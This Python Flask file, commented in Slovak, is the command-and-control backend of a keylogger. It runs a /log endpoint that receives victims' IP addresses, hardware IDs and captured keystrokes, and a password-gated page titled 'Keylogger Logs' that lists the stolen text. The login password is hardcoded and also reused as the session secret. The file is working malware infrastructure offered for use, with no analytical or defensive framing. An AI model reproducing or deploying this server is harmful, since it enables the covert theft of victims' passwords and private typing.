from flask import Flask, request, redirect, url_for, session, render_template_string
from datetime import timedelta

app = Flask(__name__)
app.secret_key = "120202810428Jm!"  # Heslo na prístup k logom
app.permanent_session_lifetime = timedelta(hours=12)

LOGIN_PASSWORD = "120202810428Jm!"

logs = []

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Keylogger Logs</title>
    <style>
        body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #0f0; padding: 6px; text-align: left; }
    </style>
</head>
<body>
    <h2>📋 Prijaté logy</h2>
    <table>
        <tr>
            <th>IP</th>
            <th>HWID</th>
            <th>Text</th>
        </tr>
        {% for log in logs %}
        <tr>
            <td>{{ log['ip'] }}</td>
            <td>{{ log['hwid'] }}</td>
            <td>{{ log['text'] }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

LOGIN_FORM = """
<form method="POST">
    <h2>🔐 Zadaj heslo pre prístup:</h2>
    <input type="password" name="password" autofocus>
    <input type="submit" value="Login">
</form>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("password") == LOGIN_PASSWORD:
            session.permanent = True
            session["logged_in"] = True
            return redirect(url_for("view_logs"))
    return LOGIN_FORM

@app.route("/logs")
def view_logs():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    return render_template_string(HTML_PAGE, logs=logs)

@app.route("/log", methods=["POST"])
def receive_log():
    data = request.get_json()
    if not data:
        return "No data", 400

    # Priprav text z logs (zoznam)
    log_text = ''.join(data.get("logs", [])) if isinstance(data.get("logs"), list) else str(data.get("logs", ""))
    
    logs.append({
        "ip": data.get("ip", "unknown"),
        "hwid": data.get("hwid", "unknown"),
        "text": log_text
    })

    print(f"Prijatý log z IP {data.get('ip')}: {log_text}")

    return "OK", 200

@app.route("/log", methods=["GET"])
def log_get():
    return "POST endpoint tu"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
